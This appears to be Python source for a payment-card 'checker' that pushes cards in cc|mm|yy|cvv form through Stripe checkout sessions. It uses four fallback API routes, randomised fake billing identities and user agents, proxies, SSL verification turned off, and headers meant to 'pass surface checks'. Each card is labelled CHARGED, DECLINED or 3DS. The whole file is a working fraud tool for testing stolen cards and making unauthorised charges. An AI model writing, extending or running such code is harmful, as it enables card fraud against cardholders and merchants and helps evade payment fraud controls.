# -*- coding: utf-8 -*-
"""Stripe charge with multi-method + multi-origin fallback.
Method A: PaymentMethod → payment_pages/confirm  (checkout origin)
Method B: Token → PaymentIntent/confirm           (checkout origin)
Method C: Token → payment_pages/confirm            (checkout origin)
Method D: Token → PaymentIntent/confirm            (js.stripe.com origin)
All methods include Stripe-Client-User-Agent header to pass surface checks.
"""
import time
import asyncio
import aiohttp

from billing_data import (
    random_full_name, random_email, random_address,
    random_user_agent, random_timezone, random_locale,
    build_stripe_headers, build_stripe_headers_js,
)

_session = None
_site_method_cache: dict[str, str] = {}


async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None


def _is_surface_error(data: dict) -> bool:
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    return "integration surface" in msg or "unsupported for publishable key" in msg


def _extract_pi_info(init_data: dict) -> tuple[str, str]:
    pi = init_data.get("payment_intent") or {}
    client_secret = pi.get("client_secret", "")
    pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
    return pi_id, client_secret


def _get_amounts(init_data: dict) -> tuple[int, int]:
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)
    if inv:
        return inv.get("total", 0), inv.get("subtotal", 0)
    pi = init_data.get("payment_intent") or {}
    amt = pi.get("amount", 0)
    return amt, amt


def _get_billing(init_data: dict) -> dict:
    cust = init_data.get("customer") or {}
    addr = cust.get("address") or {}
    billing = random_address()
    return {
        "name": cust.get("name") or billing["name"],
        "email": init_data.get("customer_email") or random_email(),
        "country": addr.get("country") or billing["country"],
        "line1": addr.get("line1") or billing["line1"],
        "city": addr.get("city") or billing["city"],
        "state": addr.get("state") or billing["state"],
        "postal_code": addr.get("postal_code") or billing["postal_code"],
    }


def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
    if _is_surface_error(conf):
        return None
    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        msg = err.get("message", "Failed")
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
    pi = conf.get("payment_intent") or {}
    st = pi.get("status", "") or conf.get("status", "")
    if st == "succeeded":
        return "CHARGED", "Charged"
    if st == "requires_action":
        return "3DS", "3DS Required"
    if st == "requires_payment_method":
        return "DECLINED", "Declined"
    return "UNKNOWN", st or "Unknown"


async def _create_token(s, card, pk, headers, proxy_url) -> dict:
    token_body = (
        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/tokens",
        headers=headers, data=token_body, proxy=proxy_url,
    ) as r:
        return await r.json()


async def _create_pm(s, card, pk, billing, headers, proxy_url) -> dict:
    pm_body = (
        f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&billing_details[name]={billing['name']}&billing_details[email]={billing['email']}"
        f"&billing_details[address][country]={billing['country']}"
        f"&billing_details[address][line1]={billing['line1']}"
        f"&billing_details[address][city]={billing['city']}"
        f"&billing_details[address][postal_code]={billing['postal_code']}"
        f"&billing_details[address][state]={billing['state']}&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers, data=pm_body, proxy=proxy_url,
    ) as r:
        return await r.json()


async def _method_a(s, card, pk, cs, init_data, headers, proxy_url):
    """PaymentMethod → payment_pages/confirm"""
    b = _get_billing(init_data)
    pm = await _create_pm(s, card, pk, b, headers, proxy_url)

    if _is_surface_error(pm):
        return None
    if "error" in pm:
        return "DECLINED", pm["error"].get("message", "Card error")[:60]
    pm_id = pm.get("id")
    if not pm_id:
        return "FAILED", "No PM"

    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    conf_body = (
        f"eid=NA&payment_method={pm_id}&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _confirm_pi_with_token(s, tok_id, pk, init_data, billing, headers, proxy_url):
    """Confirm PaymentIntent directly using a token."""
    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    confirm_body = (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"&payment_method_data[billing_details][name]={billing['name']}"
        f"&payment_method_data[billing_details][email]={billing['email']}"
        f"&payment_method_data[billing_details][address][country]={billing['country']}"
        f"&payment_method_data[billing_details][address][line1]={billing['line1']}"
        f"&payment_method_data[billing_details][address][city]={billing['city']}"
        f"&payment_method_data[billing_details][address][postal_code]={billing['postal_code']}"
        f"&payment_method_data[billing_details][address][state]={billing['state']}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=confirm_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _confirm_pages_with_token(s, tok_id, pk, cs, init_data, billing, headers, proxy_url):
    """Confirm via payment_pages using a token."""
    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    conf_body = (
        f"eid=NA&payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"&payment_method_data[billing_details][name]={billing['name']}"
        f"&payment_method_data[billing_details][email]={billing['email']}"
        f"&payment_method_data[billing_details][address][country]={billing['country']}"
        f"&payment_method_data[billing_details][address][line1]={billing['line1']}"
        f"&payment_method_data[billing_details][address][city]={billing['city']}"
        f"&payment_method_data[billing_details][address][postal_code]={billing['postal_code']}"
        f"&payment_method_data[billing_details][address][state]={billing['state']}"
        f"&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_b(s, card, pk, cs, init_data, headers, proxy_url):
    """Token (checkout origin) → PaymentIntent/confirm"""
    tok = await _create_token(s, card, pk, headers, proxy_url)
    if _is_surface_error(tok):
        return None
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]
    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    b = _get_billing(init_data)
    res = await _confirm_pi_with_token(s, tok_id, pk, init_data, b, headers, proxy_url)
    if res is None:
        res = await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, headers, proxy_url)
    return res


async def _method_c(s, card, pk, cs, init_data, headers, proxy_url):
    """Token (checkout origin) → payment_pages/confirm"""
    tok = await _create_token(s, card, pk, headers, proxy_url)
    if _is_surface_error(tok):
        return None
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]
    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    b = _get_billing(init_data)
    return await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, headers, proxy_url)


async def _method_d(s, card, pk, cs, init_data, proxy_url):
    """Token (js.stripe.com origin) → PaymentIntent/confirm — different surface"""
    ua = random_user_agent()
    js_headers = build_stripe_headers_js(ua)

    tok = await _create_token(s, card, pk, js_headers, proxy_url)
    if _is_surface_error(tok):
        return None
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]
    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    b = _get_billing(init_data)
    res = await _confirm_pi_with_token(s, tok_id, pk, init_data, b, js_headers, proxy_url)
    if res is None:
        res = await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, js_headers, proxy_url)
    return res


async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict,
    proxy_url: str | None = None,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    cached = _site_method_cache.get(cs)

    for attempt in range(max_retries + 1):
        try:
            ua = random_user_agent()
            headers = build_stripe_headers(ua)
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=25, connect=8),
            ) as s:
                all_methods = [
                    ("A", lambda: _method_a(s, card, pk, cs, init_data, headers, proxy_url)),
                    ("B", lambda: _method_b(s, card, pk, cs, init_data, headers, proxy_url)),
                    ("C", lambda: _method_c(s, card, pk, cs, init_data, headers, proxy_url)),
                    ("D", lambda: _method_d(s, card, pk, cs, init_data, proxy_url)),
                ]

                if cached and cached in ("A", "B", "C", "D"):
                    ordered = [m for m in all_methods if m[0] == cached]
                    ordered += [m for m in all_methods if m[0] != cached]
                else:
                    ordered = all_methods

                res = None
                for method_name, method_fn in ordered:
                    try:
                        res = await method_fn()
                    except Exception:
                        res = None
                    if res is not None:
                        _site_method_cache[cs] = method_name
                        break

                if res is None:
                    result["status"] = "FAILED"
                    result["response"] = "All methods unsupported"
                else:
                    result["status"], result["response"] = res

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e).lower()
            retryable = any(kw in err_str for kw in ("disconnect", "timeout", "connection", "reset"))
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result


async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, proxy_url)
